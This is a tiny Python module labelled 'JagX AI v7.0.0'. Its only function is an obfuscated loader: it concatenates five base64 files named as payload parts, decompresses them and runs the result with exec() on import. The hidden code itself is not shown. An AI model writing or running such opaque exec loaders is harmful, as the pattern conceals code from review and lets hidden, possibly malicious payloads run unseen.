"""JagX AI v7.0.0. Created by JagX & JRILICENSE."""
import gzip, base64, pathlib
_base = pathlib.Path(__file__).parent
_C = "".join((_base / n).read_text() for n in ["payload_part0.b64", "payload_part1.b64", "payload_part2.b64", "payload_part3.b64", "payload_part4.b64"])
exec(gzip.decompress(base64.b64decode(_C)).decode("utf-8"), globals())
